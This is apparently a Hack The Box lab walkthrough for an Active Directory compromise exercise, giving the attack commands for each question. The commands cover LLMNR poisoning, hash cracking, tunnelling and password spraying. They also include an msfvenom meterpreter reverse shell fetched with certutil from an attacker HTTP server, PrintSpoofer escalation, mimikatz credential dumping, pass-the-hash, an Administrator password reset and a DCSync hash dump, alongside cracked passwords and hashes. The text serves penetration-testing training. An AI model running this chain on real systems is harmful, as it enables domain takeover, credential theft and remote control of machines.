Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
```
responder -I ens224
```
- AB920

What is this user's cleartext password?
```
hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt
```

Submit the contents of the C:\flag.txt file on MS01
```
sudo nano /etc/proxychains.conf
./chisel_1.7.3_linux_amd64 server --reverse -v -p 1234 --socks5
./chisel_1.7.3_linux_amd64 client -v 10.10.15.229:1234 R:socks
sudo nano /etc/proxychains.conf
proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:linux,/home/htb-ac-1480826
```

Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
```
sudo crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee  usernames.txt
cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt
```

What is this user's password?
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt  Welcome1
```

Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
```
runas /netonly /user:INLANEFREIGHT\BR086 powershell
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```

Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
```
mssqlclient.py inlanefreight/netdb@172.16.7.60
enable_xp_cmdshell
RECONFIGURE
xp_cmdshell whoami /priv
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=8080 -f exe > backupscript.exe
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.7.240
set LPORT 8080
run
python3 -m http.server
xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/PrintSpoofer64.exe C:\Users\Public\PrintSpoofer.exe"
xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/backupscript.exe C:\Users\Public\shell.exe"
xp_cmdshell C:\Users\Public\PrintSpoofer.exe -c C:\Users\Public\shell.exe
shell
type C:\Users\Administrator\Desktop\flag.txt
```

Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host
```
load kiwi
creds_all
impacket-psexec mssqlsvc@172.16.7.50 -hashes :8c9555327d95f815987c0d81238c7660
type C:\Users\Administrator\Desktop\flag.txt
```
- load kiwi in meterpreter
- aad3b435b51404eeaad3b435b51404ee:136b3ddfbb62cb02e53a8f661248f364 (Administrator)
- 8c9555327d95f815987c0d81238c7660 (mssqlsvc)

Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
```
sudo bloodhound-python -u 'AB920' -p 'weasal' -ns 172.16.7.3 -d inlanefreight.local -c all
certutil.exe -urlcache -f http://172.16.7.240:8000/Inveigh.ps1 C:\Users\Administrator\Desktop\Inveigh.ps1
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Crack this user's password hash and submit the cleartext password as your answer.
```
sudo hashcat -a 0 -m 5600 hash rockyou.txt
```

Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
```
certutil.exe -urlcache -f http://172.16.7.240:8000/PowerView.ps1 C:\Users\Administrator\Desktop\PowerView.ps1
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'charlie1' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $SecPassword)
$adminPassword = ConvertTo-SecureString 'getH@cked!' -AsPlainText -Force
Set-DomainUserPassword -Identity Administrator -AccountPassword $adminPassword -Credential $Cred2 -Verbose
impacket-psexec Administrator@172.16.7.3
type C:\Users\Administrator\Desktop\flag.txt
```

Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.
```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/Administrator@172.16.7.3
cat inlanefreight_hashes | grep krbtgt
```
